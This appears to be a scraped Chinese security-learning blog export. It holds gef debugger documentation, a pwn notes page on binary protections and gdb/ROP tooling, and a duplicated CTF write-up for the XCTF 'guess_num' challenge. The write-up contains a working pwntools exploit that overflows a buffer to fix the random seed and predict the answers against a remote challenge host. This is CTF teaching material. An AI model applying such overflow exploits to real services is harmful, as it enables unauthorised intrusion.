class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/QBGdVqjYgC3V.png</span>)</span><br><span class="line"></span><br><span class="line">通过在生成的文本文件上使用脚本<span class="code">`ida_color_gdb_trace.py`</span>，它将为所采用的路径着色：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/FU8cbFFlzGmt.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## unicorn-emulate 命令</span></span><br><span class="line"></span><br><span class="line">如果您已经安装了[<span class="string">`unicorn`</span>](<span class="link">http://unicorn-engine.org/</span>) 仿真引擎及其Python绑定，<span class="code">`gef`</span>会集成一个新命令来模拟当前调试环境的指令！</span><br><span class="line"></span><br><span class="line">这个命令<span class="code">`unicorn-emulate`</span>（或它的别名<span class="code">`emu`</span>）将为你复制当前的内存映射（包括页面权限），默认情况下（即没有任何附加参数），它将模拟指令的执行显示即将执行的（即<span class="code">`$pc`</span>指向的那个）并显示哪个寄存器被它修改了。</span><br><span class="line"></span><br><span class="line">使用<span class="code">`-h`</span>寻求帮助</span><br></pre></td></tr></table></figure><p>gef➤ emu -h</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如，以下命令将仅执行接下来的<span class="number">2</span>条指令：</span><br></pre></td></tr></table></figure><p>gef➤ emu -n 2</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并显示： ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/BDfkWa1INP4W.png</span>)</span><br><span class="line"></span><br><span class="line">在这个例子中，我们可以看到执行后的结果</span><br></pre></td></tr></table></figure><p>0x80484db    &lt;main+75&gt;  xor    eax,eax<br>0x80484dd    &lt;main+77&gt;  add    esp,0x18</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">寄存器<span class="code">`eax`</span>和<span class="code">`esp`</span>被修改。</span><br><span class="line"></span><br><span class="line">一个方便的选项是<span class="code">`-o /path/to/file.py`</span>，它将生成一个嵌入当前执行上下文的纯Python脚本，可以在<span class="code">`gef`</span>之外重用！这对于处理混淆或解决使用SMT搭建的Crackme非常有用。</span><br><span class="line"></span><br><span class="line"><span class="section">## vmmap 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`vmmap`</span>显示整个内存空间映射。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/rBcNJQyYqRo4.png</span>)</span><br><span class="line"></span><br><span class="line">正如一位聪明的读者可能已经看到的，内存映射从一个架构到另一个架构不同（这是我首先开始使用<span class="code">`GEF`</span>的主要原因之一）。 例如，您可以了解到在SPARC体系结构上运行的ELF始终将其<span class="code">`.data`</span>和<span class="code">`heap`</span>部分设置为读/写/执行。</span><br><span class="line"></span><br><span class="line"><span class="code">`vmmap`</span>接受一个参数，一个字符串来匹配结果：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/JWbpGlm9vQl8.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## xfiles 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`xfiles`</span>是GDB命令的更方便的表示，<span class="code">`info files`</span>允许您按参数中给出的模式进行过滤。 例如，如果您只想显示代码部分（即<span class="code">`.text`</span>）：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/V1YlRTLywUvo.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## xinfo 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`xinfo`</span>命令显示作为参数给出的特定地址的所有已知信息：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/OnKTDFxzHRru.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="strong">**重要说明**</span>：出于性能原因，<span class="code">`gef`</span>会缓存某些结果。 <span class="code">`gef`</span>将尝试自动刷新自己的缓存，以避免依赖已调试过程的过时信息。 然而，在一些特殊的场景中，<span class="code">`gef`</span>可能无法检测到一些新事件，使其缓存部分过时。 如果您发现内存映射存在不一致，则可能需要通过运行命令<span class="code">`reset-cache`</span>强制<span class="code">`gef`</span>刷新其缓存并获取全新数据。</span><br><span class="line"></span><br><span class="line"><span class="section">## xor-memory 命令</span></span><br><span class="line"></span><br><span class="line">此命令用于对内存块进行异或。</span><br><span class="line"></span><br><span class="line">它的语法是：</span><br></pre></td></tr></table></figure><p>xor-memory &lt;display|patch&gt; <address> <size_to_read> <xor_key></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一个参数（`display`或`patch`）是要执行的操作：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.</span><br></pre></td></tr></table></figure><pre><code>display<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">只显示<span class="keyword">XOR</span>-<span class="keyword">ed</span>内存块结果的hexdump，而不写入调试对象的内存。</span><br></pre></td></tr></table></figure>gef➤  xor display $rsp 16 1337[+] Displaying XOR-ing 0x7fff589b67f8-0x7fff589b6808 with &apos;1337&apos;────────────────────────────────[ Original block ]────────────────────────────────────0x00007fff589b67f8     46 4e 40 00 00 00 00 00 00 00 00 00 00 00 00 00     FN@.............────────────────────────────────[ XOR-ed block ]──────────────────────────────────────0x00007fff589b67f8     55 79 53 37 13 37 13 37 13 37 13 37 13 37 13 37     UyS7.7.7.7.7.7.7<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br></pre></td></tr></table></figure>patch<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将使用<span class="keyword">xor</span>-<span class="keyword">ed</span>内容覆盖内存。</span><br></pre></td></tr></table></figure>gef➤  xor patch $rsp 16 1337[+] Patching XOR-ing 0x7fff589b67f8-0x7fff589b6808 with &apos;1337&apos;gef➤  hexdump byte $rsp 160x00007fff589b67f8     55 79 53 37 13 37 13 37 13 37     UyS7.7.7.7```</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num_wp</title>
      <link href="pwn/guess-num-wp/"/>
      <url>pwn/guess-num-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-guess-num-WP"><a href="#xctf-guess-num-WP" class="headerlink" title="xctf_guess_num WP"></a>xctf_guess_num WP</h1><a id="more"></a><h3 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h3><p>64位exb</p><p>保护全开</p><p><img src="/../images/guess-num-wp/image-20200317174455644.png" alt="image-20200317174455644"></p><!--more--><h3 id="ida-分析"><a href="#ida-分析" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>ida里的吧</p><p><img src="/../images/guess-num-wp/image-20200317174518780.png" alt="image-20200317174518780"></p><p><img src="/../images/guess-num-wp/image-20200317174557409.png" alt="image-20200317174557409"></p><p>反汇编后可以看到程序利用了随机数函数生成number</p><p>srand（） 为 rand（）的发生器</p><p><img src="/../images/guess-num-wp/image-20200317174627455.png" alt="image-20200317174627455"></p><p>从这里可以得到seed参数</p><p>进入函数内部看到</p><p><img src="/../images/guess-num-wp/image-20200317174703813.png" alt="image-20200317174703813"></p><p>得出了 result 函数返回值  = buf = urandom-&gt; fd</p><p>调用的文件给了提示</p><!--qword 类型为 无符号的整型（0~2^64 - 1)--><p>think_1:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用缓冲区溢出修改seed值，固定</span><br><span class="line">但从反汇编代码看程序需要循环<span class="number">10</span>次才能正常退出循环</span><br><span class="line">漏洞函数sub_C3E()再循环体外</span><br></pre></td></tr></table></figure><p>think_2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过循环体  无法执行， 程序保护开满</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><p><img src="/../images/guess-num-wp/image-20200317174718651.png" alt="image-20200317174718651"></p><p>c99 scanf函数</p><p><img src="/../images/guess-num-wp/image-20200317174730510.png" alt="image-20200317174730510"></p><p>看大佬wp得到</p><p>固定种子 ， 测试得到答案</p><p><img src="/../images/guess-num-wp/image-20200317174743470.png" alt="image-20200317174743470">gets参数和seed 偏移量为 0x20</p><p>构造</p><p>payload = ‘a’ *0x20 + p64(1)    <!--缓冲区溢出--></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后通过加载linux内函数库调用rand函数，实现伪随机数的再实现并发送到环境内, p64(<span class="number">1</span>)为调用函数后的返回地址,</span><br><span class="line">但有时会重复利用漏洞函数，就需要用漏洞函数所在的地址来做<span class="keyword">call</span> <span class="function"><span class="keyword">function</span></span> 后的返回地址</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">r = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44179'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">'Your name:'</span>,payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):  <span class="comment">#use python write a script</span></span><br><span class="line">num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">r.sendline(num)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num_wp</title>
      <link href="pwn/guess-num-wp/guess-num-wp/"/>
      <url>pwn/guess-num-wp/guess-num-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-guess-num-WP"><a href="#xctf-guess-num-WP" class="headerlink" title="xctf_guess_num WP"></a>xctf_guess_num WP</h1><a id="more"></a><h3 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h3><p>64位exb</p><p>保护全开</p><p><img src="/../images/guess-num-wp/image-20200317174455644.png" alt="image-20200317174455644"></p><!--more--><h3 id="ida-分析"><a href="#ida-分析" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>ida里的吧</p><p><img src="/../images/guess-num-wp/image-20200317174518780.png" alt="image-20200317174518780"></p><p><img src="/../images/guess-num-wp/image-20200317174557409.png" alt="image-20200317174557409"></p><p>反汇编后可以看到程序利用了随机数函数生成number</p><p>srand（） 为 rand（）的发生器</p><p><img src="/../images/guess-num-wp/image-20200317174627455.png" alt="image-20200317174627455"></p><p>从这里可以得到seed参数</p><p>进入函数内部看到</p><p><img src="/../images/guess-num-wp/image-20200317174703813.png" alt="image-20200317174703813"></p><p>得出了 result 函数返回值  = buf = urandom-&gt; fd</p><p>调用的文件给了提示</p><!--qword 类型为 无符号的整型（0~2^64 - 1)--><p>think_1:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用缓冲区溢出修改seed值，固定</span><br><span class="line">但从反汇编代码看程序需要循环<span class="number">10</span>次才能正常退出循环</span><br><span class="line">漏洞函数sub_C3E()再循环体外</span><br></pre></td></tr></table></figure><p>think_2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过循环体  无法执行， 程序保护开满</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><p><img src="/../images/guess-num-wp/image-20200317174718651.png" alt="image-20200317174718651"></p><p>c99 scanf函数</p><p><img src="/../images/guess-num-wp/image-20200317174730510.png" alt="image-20200317174730510"></p><p>看大佬wp得到</p><p>固定种子 ， 测试得到答案</p><p><img src="/../images/guess-num-wp/image-20200317174743470.png" alt="image-20200317174743470">gets参数和seed 偏移量为 0x20</p><p>构造</p><p>payload = ‘a’ *0x20 + p64(1)    <!--缓冲区溢出--></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后通过加载linux内函数库调用rand函数，实现伪随机数的再实现并发送到环境内, p64(<span class="number">1</span>)为调用函数后的返回地址,</span><br><span class="line">但有时会重复利用漏洞函数，就需要用漏洞函数所在的地址来做<span class="keyword">call</span> <span class="function"><span class="keyword">function</span></span> 后的返回地址</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">r = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44179'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">'Your name:'</span>,payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):  <span class="comment">#use python write a script</span></span><br><span class="line">num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">r.sendline(num)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN</title>
      <link href="pwn/pwn/"/>
      <url>pwn/pwn/</url>
      
        <content type="html"><![CDATA[<!--this page will often renew --><a id="more"></a><h2 id="32-bit-depend"><a href="#32-bit-depend" class="headerlink" title="32 bit_depend"></a>32 bit_depend</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">32位程序不能直接在64位linux下安装, 需要安装32位依赖:</span><br><span class="line">$ sudo apt-get install ia32-libs</span><br><span class="line">无法安装，找不到库，就用下面这个方法打开多架构支持，然后更新</span><br><span class="line"></span><br><span class="line">$ sudo dpkg –add-architecture i386</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install ia32-libs</span><br><span class="line"></span><br><span class="line">如果没有ia32-libs就用</span><br><span class="line"></span><br><span class="line">$ sudo dpkg –add-architecture i386</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install lib32ncurses5 lib32z1</span><br><span class="line"></span><br><span class="line">安装pwntools的过程中如果出错的话用这句话</span><br><span class="line">sudo apt-get install build-essential libssl-dev libffi-dev python-dev</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a><strong>NX保护</strong></h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 数据段上指令无法执行</span><br><span class="line">数据执行保护(NX/DEP)  NX即No-eXcute(不可执行) ,当程序溢出成功转入shellcode时，程序会尝试在</span><br><span class="line">数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</span><br><span class="line">绕过方法<span class="symbol">:ROP</span></span><br><span class="line">让攻击者难以找到shellcode地址</span><br></pre></td></tr></table></figure><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  地址空间布局随机化（<span class="keyword">address </span><span class="meta">space</span> layout randomization)</span><br><span class="line">绕过方法: <span class="meta">info</span> leak . ret2dirsolve . ROP</span><br><span class="line">检测Stack Overflow</span><br><span class="line">stack canary/cookie</span><br><span class="line">绕过方法:infoleak</span><br><span class="line">现在NX+Stack Canary + ASLR基本是标配</span><br></pre></td></tr></table></figure><h3 id="绕过stack-canary"><a href="#绕过stack-canary" class="headerlink" title="绕过stack canary :"></a>绕过stack canary :</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通常通过在栈中插入cookie信息（一般在ebp(栈底)上方），在函数返回的时候检查cookie是否改变，</span><br><span class="line">如果改变则认为栈结构被破坏，则调用一个函数强制停止程序。</span><br><span class="line">当开启Canary保护的时候不能通过传统的栈溢出直接覆盖返回值劫持EIP</span><br></pre></td></tr></table></figure><p>solve：    Leak Canary   : 通过printf 的泄露, Canary 一般从00 开始</p><p>​    ····Overwrite Canary<br>​    </p><h3 id="Linux-kernel-保护机制"><a href="#Linux-kernel-保护机制" class="headerlink" title="Linux kernel 保护机制"></a>Linux kernel 保护机制</h3><h3 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#### （一种增强保护机制，防止缓冲区溢出攻击，会替换诸如memcpy、memset、strcpy等危险函数）。</span><br></pre></td></tr></table></figure><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">精度glibc内存管理ptmalloc源代码分析.pdf  先通读,再用作工具书 精读</span><br><span class="line"></span><br><span class="line">上书<span class="number">1</span>~<span class="number">27</span> 页 , 粗度<span class="number">28</span> ~ <span class="number">130</span> 页  <span class="meta">area</span>, <span class="keyword">bin, </span>chunk . Know <span class="keyword">it </span><span class="keyword">and </span>pwn <span class="keyword">it</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">通用防护 </span>ASLR , DEP</span><br></pre></td></tr></table></figure><h2 id="gdb插件-控制-pwndbg-peda-gef-切换"><a href="#gdb插件-控制-pwndbg-peda-gef-切换" class="headerlink" title="gdb插件, 控制 pwndbg, peda, gef 切换"></a>gdb插件, 控制 pwndbg, peda, gef 切换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">function</span> Mode_change &#123;</span><br><span class="line">    name=<span class="variable">$1</span></span><br><span class="line">    gdbinitfile=~/.gdbinit    <span class="comment">#按照实际情况修改</span></span><br><span class="line">    gdbinitfile=/root/Desktop/mode</span><br></pre></td></tr></table></figure><pre><code>peda=&quot;source ~/peda/peda.py&quot;   #这个路径按照你的实际情况修改gef=&quot;source ~/.gdbinit-gef.py&quot;   #这个路径按照你的实际情况修改pwndbg=&quot;source /opt/pwndbg/gdbinit.py&quot;   #这个路径按照你的实际情况修改sign=$(cat $gdbinitfile | grep -n &quot;#this place is controled by user&apos;s shell&quot;)            #此处上面的查找内容要和你自己的保持一致pattern=&quot;:#this place is controled by user&apos;s shell&quot;number=${sign%$pattern}location=$[number+2]parameter_add=${location}iparameter_del=${location}dmessage=&quot;TEST&quot;if [ $name -eq &quot;1&quot; ];then    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $peda&quot; $gdbinitfile    echo -e &quot;Please enjoy the peda!\n&quot;elif [ $name -eq &quot;2&quot; ];then    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $gef&quot; $gdbinitfile    echo -e &quot;Please enjoy the gef!\n&quot;else    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $pwndbg&quot; $gdbinitfile    echo -e &quot;Please enjoy the pwndbg!\n&quot;fi}echo -e &quot;Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg&quot;read -p &quot;Input your choice:&quot; numif [ $num -eq &quot;1&quot; ];then    Mode_change $numelif [ $num -eq &quot;2&quot; ];then    Mode_change $numelif [ $num -eq &quot;3&quot; ];then    Mode_change $numelse    echo -e &quot;Error!\nPleasse input right number!&quot;figdb $1 $2 $3 $4 $5 $6 $7 $8 $9 --&gt; </code></pre><ul><li><a href="https://www.jianshu.com/p/94a71af2022a" target="_blank" rel="noopener">脚本转自他人简书博客</a></li></ul><h3 id="peda"><a href="#peda" class="headerlink" title="peda:"></a>peda:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">aslr -- Show&#x2F;set ASLR setting of GDB</span><br><span class="line">checksec -- Check for various security options of binary</span><br><span class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</span><br><span class="line">dumprop -- Dump all ROP gadgets in specific memory range</span><br><span class="line">elfheader -- Get headers information from debugged ELF file</span><br><span class="line">可以获取.plt位置</span><br><span class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">lookup -- Search for all addresses&#x2F;references to addresses which belong to a memory range</span><br><span class="line">patch -- Patch memory start at an address with string&#x2F;hexstring&#x2F;int</span><br><span class="line">pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">pattern offset value 定位字符串</span><br><span class="line">procinfo -- Display various info from &#x2F;proc&#x2F;pid&#x2F;</span><br><span class="line">pshow -- Show various PEDA options and other settings</span><br><span class="line">pset -- Set various PEDA options and other settings</span><br><span class="line">readelf -- Get headers information from an ELF file</span><br><span class="line">ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">ropsearch -- Search for ROP gadgets in memory</span><br><span class="line">searchmem|find -- Search for a pattern in memory; support regex search</span><br><span class="line">find &quot;&#x2F;bin&#x2F;bash&#x2F;&quot; libc</span><br><span class="line">shellcode -- Generate or download common shellcodes.</span><br><span class="line">skeleton -- Generate python exploit code template</span><br><span class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</span><br><span class="line">xormem -- XOR a memory region with a key</span><br></pre></td></tr></table></figure><h3 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h3><p>heap 模块为堆利用神器 ，所以翻了翻goole  找到了最终的下载</p><!--wget 连接实在不好用--><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone http://www.github.<span class="keyword">com</span>/hugsy/gef</span><br><span class="line"><span class="keyword">cd</span> gef</span><br><span class="line">gef/ # <span class="keyword">echo</span> <span class="keyword">source</span> gef.<span class="keyword">py</span> &gt;&gt;~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="dbg"><a href="#dbg" class="headerlink" title="dbg"></a>dbg</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break </span>*<span class="keyword">address</span></span><br><span class="line"><span class="keyword">c </span>单步走</span><br></pre></td></tr></table></figure><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> pip install ropgadget</span><br><span class="line"> ROPgadget:</span><br><span class="line"> usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] 